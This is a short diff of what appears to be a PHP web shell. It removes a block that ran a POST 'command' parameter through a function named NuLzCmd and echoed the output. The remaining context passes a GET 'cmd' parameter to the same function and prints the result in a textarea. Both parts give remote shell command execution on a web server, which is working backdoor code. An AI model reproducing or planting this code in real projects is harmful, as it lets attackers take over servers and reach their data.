@@ -73,18 +73,6 @@ function NuLzCmd($komendnya) {
     }
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['command'])) {
-    $command = $_POST['command'];
-    $output = NuLzCmd($command);
-    if ($output !== false) {
-        echo $output;
-    } else {
-        echo "Error executing command.";
-    }
-} else {
-    echo "Invalid request.";
-}
-
 if (isset($_GET['cmd'])) {
     $komendnya = $_GET['cmd'];
     echo '<center><textarea rows="50" cols="80">';
